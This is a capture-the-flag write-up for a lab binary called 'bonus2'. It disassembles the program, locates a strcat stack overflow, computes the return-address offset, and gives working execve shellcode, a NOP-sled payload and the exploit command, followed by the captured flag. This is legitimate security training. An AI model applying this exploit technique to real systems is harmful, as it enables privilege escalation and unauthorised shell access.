# Bonus 2

## Connect to the virtual machine with SSH

Use the flag from `bonus1` as the `bonus2` password:

```bash
ssh bonus2@127.0.0.1 -p 2223
```

## Copy the binary to the host machine

From the root of this repository on the host:

```bash
scp -P 2223 bonus2@127.0.0.1:/home/user/bonus2/bonus2 ./bonus2/
```

The extracted binary is saved as `bonus2/bonus2`.

## Copy the GDB dump to the host

Inside the VM, connected as `bonus2`, open the binary with GDB:

```bash
gdb ./bonus2
```

Then enter:

```gdb
set disassembly-flavor intel
set pagination off
set logging file /tmp/bonus2_main_dump_gdb
set logging overwrite on
set logging on
disas main
disas greetuser
set logging off
quit
```

Then copy the dump back from the host:

```bash
scp -P 2223 bonus2@127.0.0.1:/tmp/bonus2_main_dump_gdb ./bonus2/
```

Since the binary is already on the host, the same dump can also be generated
locally:

```bash
gdb -q -batch \
  -ex "set disassembly-flavor intel" \
  -ex "disassemble main" \
  -ex "disassemble greetuser" \
  ./bonus2/bonus2 > ./bonus2/bonus2_main_dump_gdb
```

## Analyze the GDB dump

The program requires exactly two arguments:

```asm
0x08048538 <+15>: cmp    DWORD PTR [ebp+0x8],0x3
0x0804853c <+19>: je     0x8048548 <main+31>
```

It copies up to 40 bytes from `argv[1]`, then up to 32 bytes from `argv[2]`,
into a stack buffer:

```asm
0x08048564 <+59>:  mov    DWORD PTR [esp+0x8],0x28
0x08048577 <+78>:  call   0x80483c0 <strncpy@plt>
...
0x08048584 <+91>:  mov    DWORD PTR [esp+0x8],0x20
0x0804859a <+113>: call   0x80483c0 <strncpy@plt>
```

Then it reads the `LANG` environment variable:

```asm
0x0804859f <+118>: mov    DWORD PTR [esp],0x8048738
0x080485a6 <+125>: call   0x8048380 <getenv@plt>
```

If `LANG` starts with `fi`, it sets the language to `1`. If it starts with
`nl`, it sets the language to `2`:

```asm
0x080485df <+182>: mov    DWORD PTR ds:0x8049988,0x1
...
0x0804860e <+229>: mov    DWORD PTR ds:0x8049988,0x2
```

Finally, it copies the prepared argument buffer into `greetuser`:

```asm
0x08048629 <+256>: rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
0x0804862b <+258>: call   0x8048484 <greetuser>
```

`greetuser` creates a local buffer and writes a greeting prefix into it. The
prefix depends on the language:

```text
default: "Hello "
nl:      "Goedemiddag! "
```

Then it appends the argument buffer with `strcat`:

```asm
0x0804850a <+134>: lea    eax,[ebp+0x8]
0x08048511 <+141>: lea    eax,[ebp-0x48]
0x08048517 <+147>: call   0x8048370 <strcat@plt>
```

This can overflow `greetuser`'s local buffer and overwrite its saved return
address.

## Find the exact offset

Use `LANG=nl` because the Dutch greeting is the longest useful prefix:

```text
Goedemiddag!
```

It is 13 bytes long.

Break after `strcat` in `greetuser` and calculate the distance from the local
buffer to the saved return address:

```gdb
break *greetuser+152
run $(python -c "print \"A\"*40") $(python -c "print \"B\"*32")
p/x $ebp+4
p/x $ebp-0x48
p/d ($ebp+4)-($ebp-0x48)
```

Run GDB with `LANG=nl`:

```bash
LANG=nl gdb ./bonus2
```

Result:

```text
Breakpoint 1, 0x0804851c in greetuser ()
$1 = 0xbffffb2c
$2 = 0xbffffae0
$3 = 76
```

So the saved return address is 76 bytes after the start of `greetuser`'s local
buffer.

With `LANG=nl`, the layout before the saved return address is:

```text
13 bytes greeting + 40 bytes argv[1] + 23 bytes argv[2] = 76
```

So the return address starts after 23 bytes in `argv[2]`.

## Build the exploit

NX is disabled, so use shellcode. Store it in an environment variable with a
large NOP sled:

```bash
export SC=$(perl -e 'print "\x90" x 1000 . "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

In GDB, the variable is around:

```gdb
break main
run
p/x (char *)getenv("SC")
```

Result:

```text
$1 = 0xbffffb37
```

Because `SC` starts with a large NOP sled, returning to `0xbffffb37` reaches the
shellcode.

Payload:

```text
argv[1] = 40 bytes
argv[2] = 23 bytes + 0xbffffb37
```

Address in little endian:

```text
0xbffffb37 -> \x37\xfb\xff\xbf
```

## Exploitation

Run this in the VM:

```bash
export SC=$(perl -e 'print "\x90" x 1000 . "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
(LANG=nl /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\x37\xfb\xff\xbf"'); cat)
```

The `cat` keeps stdin open for the shell.

Check the effective identity:

```bash
whoami
```

Result:

```text
bonus3
```

Read the next password:

```bash
cat /home/user/bonus3/.pass
```

## Flag

```text
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
